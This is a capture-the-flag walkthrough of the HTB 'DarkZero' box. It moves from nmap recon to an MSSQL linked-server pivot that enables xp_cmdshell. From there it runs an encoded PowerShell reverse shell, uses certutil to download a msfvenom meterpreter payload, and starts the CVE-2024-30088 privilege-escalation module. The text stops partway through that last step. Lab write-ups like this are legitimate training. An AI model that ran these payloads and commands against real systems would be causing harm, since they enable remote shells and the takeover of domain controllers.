---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Windows
  - cve_2024_30088_authz_basep
---
# Overview

| Name        | DarkZero  |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Hard [40] |
| Status      | Done      |

As is common in real life pentests, you will start the DarkZero box with credentials for the following account `john.w` / `RFulUtONCOL!`
# Recon

```bash
┌─[us-free-1]─[10.10.14.136]─[at0mxploit@htb-oougm2vvx3]─[~]
└──╼ [★]$ sudo nmap -sC -sV 10.10.11.89
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-05 02:35 CDT
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.84% done; ETC: 02:36 (0:00:00 remaining)
Nmap scan report for 10.10.11.89
Host is up (0.036s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-05 14:35:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2025-07-29T11:40:00
|_Not valid after:  2026-07-29T11:40:00
|_ssl-date: TLS randomness does not represent time
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ms-sql-info: 
|   10.10.11.89:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
|_ssl-date: 2025-10-05T14:36:54+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.89:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-05T10:33:24
|_Not valid after:  2055-10-05T10:33:24
2179/tcp open  vmrdp?
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2025-10-05T14:36:17
|_  start_date: N/A
```

```bash
echo "10.10.11.89 darkzero.htb DC01.darkzero.htb" | sudo tee -a /etc/hosts
```

```bash
┌─[us-free-1]─[10.10.14.136]─[at0mxploit@htb-oougm2vvx3]─[~]
└──╼ [★]$ nxc smb 10.10.11.89 -u john.w -p 'RFulUtONCOL!' --shares
SMB         10.10.11.89     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.89     445    DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
SMB         10.10.11.89     445    DC01             [*] Enumerated shares
SMB         10.10.11.89     445    DC01             Share           Permissions     Remark
SMB         10.10.11.89     445    DC01             -----           -----------     ------
SMB         10.10.11.89     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.89     445    DC01             C$                              Default share
SMB         10.10.11.89     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.89     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.89     445    DC01             SYSVOL          READ            Logon server share
```

```bash
┌─[us-free-1]─[10.10.14.136]─[at0mxploit@htb-oougm2vvx3]─[~]
└──╼ [★]$ nxc winrm 10.10.11.89 -u john.w -p 'RFulUtONCOL!'
WINRM       10.10.11.89     5985   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
WINRM       10.10.11.89     5985   DC01             [-] darkzero.htb\john.w:RFulUtONCOL!
┌─[us-free-1]─[10.10.14.136]─[at0mxploit@htb-oougm2vvx3]─[~]
└──╼ [★]$ nxc mssql 10.10.11.89 -u john.w -p 'RFulUtONCOL!'
MSSQL       10.10.11.89     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
MSSQL       10.10.11.89     1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
```

The SQL Server on port 1433 might be interesting since it's running on a Domain Controller, which is unusual.

```bash
┌─[us-free-1]─[10.10.14.136]─[at0mxploit@htb-oougm2vvx3]─[~]
└──╼ [★]$ nxc mssql 10.10.11.89 -u john.w -p 'RFulUtONCOL!' --query "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');"
MSSQL       10.10.11.89     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
MSSQL       10.10.11.89     1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
MSSQL       10.10.11.89     1433   DC01             darkzero\john.w
MSSQL       10.10.11.89     1433   DC01             0
```

We are not sysadmin. Let's see Linked Server:

```bash
❯ nxc mssql 10.10.11.89 -u john.w -p 'RFulUtONCOL!' --query "EXEC sp_linkedservers;"
MSSQL       10.10.11.89     1433   DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
MSSQL       10.10.11.89     1433   DC01             [+] darkzero.htb\john.w:RFulUtONCOL!
MSSQL       10.10.11.89     1433   DC01             SRV_NAME:DC01
MSSQL       10.10.11.89     1433   DC01             SRV_PROVIDERNAME:SQLNCLI
MSSQL       10.10.11.89     1433   DC01             SRV_PRODUCT:SQL Server
MSSQL       10.10.11.89     1433   DC01             SRV_DATASOURCE:DC01
MSSQL       10.10.11.89     1433   DC01             SRV_PROVIDERSTRING:NULL
MSSQL       10.10.11.89     1433   DC01             SRV_LOCATION:NULL
MSSQL       10.10.11.89     1433   DC01             SRV_CAT:NULL
MSSQL       10.10.11.89     1433   DC01             SRV_NAME:DC02.darkzero.ext
MSSQL       10.10.11.89     1433   DC01             SRV_PROVIDERNAME:SQLNCLI
MSSQL       10.10.11.89     1433   DC01             SRV_PRODUCT:SQL Server
MSSQL       10.10.11.89     1433   DC01             SRV_DATASOURCE:DC02.darkzero.ext
MSSQL       10.10.11.89     1433   DC01             SRV_PROVIDERSTRING:NULL
MSSQL       10.10.11.89     1433   DC01             SRV_LOCATION:NULL
MSSQL       10.10.11.89     1433   DC01             SRV_CAT:NULL
```
# Initial Foothold

```bash
❯ mssqlclient.py darkzero.htb/john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```

```bash
SQL (darkzero\john.w  guest@master)> EXEC('SELECT @@version') AT [DC02.darkzero.ext]
                                                                                                                                                  
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64)
        Oct  8 2022 05:58:25
        Copyright (C) 2022 Microsoft Corporation
        Enterprise Evaluation Edition (64-bit) on Windows Server 2022 Datacenter 10.0 <X64> (Build 20348: ) (Hypervisor)
```

The `EXEC AT` method works. We can execute commands on the linked server DC02. Let's proceed with enabling xp_cmdshell and getting a reverse shell:

```bash
SQL (darkzero\john.w  guest@master)> EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (darkzero\john.w  guest@master)> EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (darkzero\john.w  guest@master)> EXEC('sp_configure ''xp_cmdshell'';') AT [DC02.darkzero.ext]
name          minimum   maximum   config_value   run_value
-----------   -------   -------   ------------   ---------
xp_cmdshell         0         1              1           1
```

```bash
SQL (darkzero\john.w  guest@master)> EXEC('xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
output
--------------------
darkzero-ext\svc_sql

NULL
```

Now that command works, Let's get reverse shell. Get powershell base64 encoded payload [here](https://www.revshells.com/).

```bash
SQL (darkzero\john.w  guest@master)> EXEC('xp_cmdshell ''powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADYAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA''') AT [DC02.darkzero.ext]
```

```bash
❯ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.89 51119

PS C:\Windows\system32> whoami

darkzero-ext\svc_sql
```

```bash
PS C:\Windows\system32> PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```bash
PS C:\Users> hostname
DC02
```

We need to pivot back to DC01 where user flag might be.

```bash
PS C:\Users> ping DC01.darkzero.htb


Pinging dc01.darkzero.htb [10.10.11.89] with 32 bytes of data:
Reply from 10.10.11.89: bytes=32 time=6ms TTL=127
Reply from 10.10.11.89: bytes=32 time<1ms TTL=127
Reply from 10.10.11.89: bytes=32 time<1ms TTL=127
Reply from 10.10.11.89: bytes=32 time<1ms TTL=127

Ping statistics for 10.10.11.89:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 6ms, Average = 1ms
PS C:\Users> PS C:\Users>
```

```bash
PS C:\Users\svc_sql> systeminfo

Host Name:                 DC02
OS Name:                   Microsoft Windows Server 2022 Datacenter
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-70295-72962-AA965
Original Install Date:     7/29/2025, 5:57:54 AM
System Boot Time:          10/6/2025, 12:15:57 PM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.1, 11/21/2024
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 931 MB
Virtual Memory: Max Size:  3,475 MB
Virtual Memory: Available: 1,615 MB
Virtual Memory: In Use:    1,860 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    darkzero.ext
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.20.2
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```bash
PS C:\Users\svc_sql\Desktop> cd c:\
PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name                   
----                 -------------         ------ ----                   
d-----          5/8/2021   1:15 AM                PerfLogs               
d-r---         7/29/2025   7:49 AM                Program Files          
d-----         7/29/2025   7:48 AM                Program Files (x86)    
d-r---         7/29/2025   8:23 AM                Users                  
d-----         7/30/2025   3:57 PM                Windows                
-a----         7/30/2025   6:38 AM          18594 Policy_Backup.inf      
```

```bash
PS C:\> type C:\Policy_Backup.inf
[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 1
MaximumPasswordAge = 42
MinimumPasswordLength = 7
PasswordComplexity = 1
PasswordHistorySize = 24
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
NewAdministratorName = "Administrator"
NewGuestName = "Guest"
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
EnableAdminAccount = 1
EnableGuestAccount = 0
[Event Audit]
AuditSystemEvents = 0
AuditLogonEvents = 0
AuditObjectAccess = 0
AuditPrivilegeUse = 0
AuditPolicyChange = 0
AuditAccountManage = 0
AuditProcessTracking = 0
AuditDSAccess = 0
AuditAccountLogon = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Registry Values]
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryConsole\SecurityLevel=4,0
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Setup\RecoveryConsole\SetCommand=4,0
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\CachedLogonsCount=1,"10"
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ForceUnlockLogon=4,0
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\PasswordExpiryWarning=4,5
MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ScRemoveOption=1,"0"
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin=4,5
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser=4,3
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableCAD=4,0
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName=4,0
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection=4,1
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA=4,1
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths=4,1
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle=4,0
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization=4,1
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption=1,""
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeText=7,
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop=4,1
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ScForceOption=4,0
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ShutdownWithoutLogon=4,0
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\UndockWithoutLogon=4,1
MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures=4,0
MACHINE\Software\Policies\Microsoft\Windows\Safer\CodeIdentifiers\AuthenticodeEnabled=4,0
MACHINE\System\CurrentControlSet\Control\Lsa\AuditBaseObjects=4,0
MACHINE\System\CurrentControlSet\Control\Lsa\CrashOnAuditFail=4,0
MACHINE\System\CurrentControlSet\Control\Lsa\DisableDomainCreds=4,0
MACHINE\System\CurrentControlSet\Control\Lsa\EveryoneIncludesAnonymous=4,0
MACHINE\System\CurrentControlSet\Control\Lsa\FIPSAlgorithmPolicy\Enabled=4,0
MACHINE\System\CurrentControlSet\Control\Lsa\ForceGuest=4,0
MACHINE\System\CurrentControlSet\Control\Lsa\FullPrivilegeAuditing=3,0
MACHINE\System\CurrentControlSet\Control\Lsa\LimitBlankPasswordUse=4,1
MACHINE\System\CurrentControlSet\Control\Lsa\MSV1_0\NTLMMinClientSec=4,536870912
MACHINE\System\CurrentControlSet\Control\Lsa\MSV1_0\NTLMMinServerSec=4,536870912
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
MACHINE\System\CurrentControlSet\Control\Lsa\RestrictAnonymous=4,0
MACHINE\System\CurrentControlSet\Control\Lsa\RestrictAnonymousSAM=4,1
MACHINE\System\CurrentControlSet\Control\Print\Providers\LanMan Print Services\Servers\AddPrinterDrivers=4,1
MACHINE\System\CurrentControlSet\Control\SecurePipeServers\Winreg\AllowedExactPaths\Machine=7,System\CurrentControlSet\Control\ProductOptions,System\CurrentControlSet\Control\Server Applications,Software\Microsoft\Windows NT\CurrentVersion
MACHINE\System\CurrentControlSet\Control\SecurePipeServers\Winreg\AllowedPaths\Machine=7,System\CurrentControlSet\Control\Print\Printers,System\CurrentControlSet\Services\Eventlog,Software\Microsoft\OLAP Server,Software\Microsoft\Windows NT\CurrentVersion\Print,Software\Microsoft\Windows NT\CurrentVersion\Windows,System\CurrentControlSet\Control\ContentIndex,System\CurrentControlSet\Control\Terminal Server,System\CurrentControlSet\Control\Terminal Server\UserConfig,System\CurrentControlSet\Control\Terminal Server\DefaultUserConfiguration,Software\Microsoft\Windows NT\CurrentVersion\Perflib,System\CurrentControlSet\Services\SysmonLog,SYSTEM\CurrentControlSet\Services\CertSvc
MACHINE\System\CurrentControlSet\Control\Session Manager\Kernel\ObCaseInsensitive=4,1
MACHINE\System\CurrentControlSet\Control\Session Manager\Memory Management\ClearPageFileAtShutdown=4,0
MACHINE\System\CurrentControlSet\Control\Session Manager\ProtectionMode=4,1
MACHINE\System\CurrentControlSet\Control\Session Manager\SubSystems\optional=7,
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\AutoDisconnect=4,15
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableForcedLogOff=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\NullSessionPipes=7,,netlogon,samr,lsarpc
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RestrictNullSessAccess=4,1
MACHINE\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\EnablePlainTextPassword=4,0
MACHINE\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\EnableSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanmanWorkstation\Parameters\RequireSecuritySignature=4,0
MACHINE\System\CurrentControlSet\Services\LDAP\LDAPClientIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange=4,0
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\MaximumPasswordAge=4,30
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireStrongKey=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\SealSecureChannel=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\SignSecureChannel=4,1
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
[Privilege Rights]
SeNetworkLogonRight = *S-1-1-0,*S-1-5-11,*S-1-5-32-544,*S-1-5-32-554,*S-1-5-9
SeMachineAccountPrivilege = *S-1-5-11
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-549,*S-1-5-32-551
SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-11,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-32-554,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
SeSystemtimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549
SeAuditPrivilege = *S-1-5-19,*S-1-5-20
SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0
SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550
SeBatchLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559
SeServiceLogonRight = *S-1-5-20,svc_sql,SQLServer2005SQLBrowserUser$DC02,*S-1-5-80-0,*S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
SeInteractiveLogonRight = *S-1-5-32-544,*S-1-5-32-548,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-32-551,*S-1-5-9
SeSecurityPrivilege = *S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-80-344959196-2060754871-2302487193-2804545603-1466107430,*S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-549,*S-1-5-32-551
SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-32-551
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
SeManageVolumePrivilege = *S-1-5-32-544
SeRemoteInteractiveLogonRight = *S-1-5-32-544
SeImpersonatePrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
SeCreateGlobalPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-6
SeIncreaseWorkingSetPrivilege = *S-1-5-32-545
SeTimeZonePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
SeCreateSymbolicLinkPrivilege = *S-1-5-32-544
SeDelegateSessionUserImpersonatePrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"
Revision=1
```

```bash
PS C:\Users\svc_sql> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"OS Build"
OS Name:                   Microsoft Windows Server 2022 Datacenter
OS Version:                10.0.20348 N/A Build 20348
OS Build Type:             Multiprocessor Free
```

CVE-2024-30088 affects **Windows Server 2022 builds before KB5037771** (May 2024 patch), and our system is on the original build 20348.

```bash
❯ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.136 LPORT=5555 -f exe -o meterpreter.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: meterpreter.exe
❯ python3 -m http.server 8080
```

```bash
PS C:\Users\svc_sql> certutil -urlcache -f http://10.10.14.136:8080/meterpreter.exe meterpreter.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Users\svc_sql> ls


    Directory: C:\Users\svc_sql


Mode                 LastWriteTime         Length Name                                                   
----                 -------------         ------ ----                                                   
d-r---         10/6/2025   3:10 PM                Desktop                                                
d-r---         7/29/2025   8:23 AM                Documents                                              
d-r---          5/8/2021   1:15 AM                Downloads                                              
d-r---          5/8/2021   1:15 AM                Favorites                                              
d-r---          5/8/2021   1:15 AM                Links                                                  
d-r---          5/8/2021   1:15 AM                Music                                                  
d-r---          5/8/2021   1:15 AM                Pictures                                               
d-----          5/8/2021   1:15 AM                Saved Games                                            
d-r---          5/8/2021   1:15 AM                Videos                                                 
-a----         10/6/2025  12:24 PM           7168 amqdou2.exe                                            
-a----         10/6/2025  12:30 PM           7168 amqdoufi.exe                                           
-a----         10/6/2025  12:21 PM           7168 amqdoustop.exe                                         
-a----         10/6/2025   3:13 PM           7680 meterpreter.exe                                        
-a----         10/6/2025  12:44 PM         462848 Rubeus.exe                                             
```

```bash
❯ msfconsole -q
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.14.136
LHOST => 10.10.14.136
msf exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 10.10.14.136:5555
```

```bash
PS C:\Users\svc_sql> ./meterpreter.exe
PS C:\Users\svc_sql>
```

```bash
msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.136:5555
[*] Sending stage (203846 bytes) to 10.10.11.89
[*] Meterpreter session 1 opened (10.10.14.136:5555 -> 10.10.11.89:51082) at 2025-10-06 20:59:15 +0545

meterpreter > background
```

```bash
msf post(multi/recon/local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Name  Type               Information        Connection
  --  ----  ----               -----------        ----------
  2         meterpreter x64/w  darkzero-ext\svc_  10.10.14.136:5555
            indows             sql @ DC02         -> 10.10.11.89:510
                                                  37 (172.16.20.2)

msf post(multi/recon/local_exploit_suggester) > set SESSION 2
SESSION => 2
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2024_30088_authz_basep
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/cve_2024_30088_authz_basep) > set SESSION 2
SESSION => 2
msf exploit(windows/local/cve_2024_30088_authz_basep) > show options

Module options (exploit/windows/local/cve_2024_30088_authz_basep):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  2                yes       The session to run this modul
                                       e on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: ''
                                        , seh, thread, process, none
                                        )
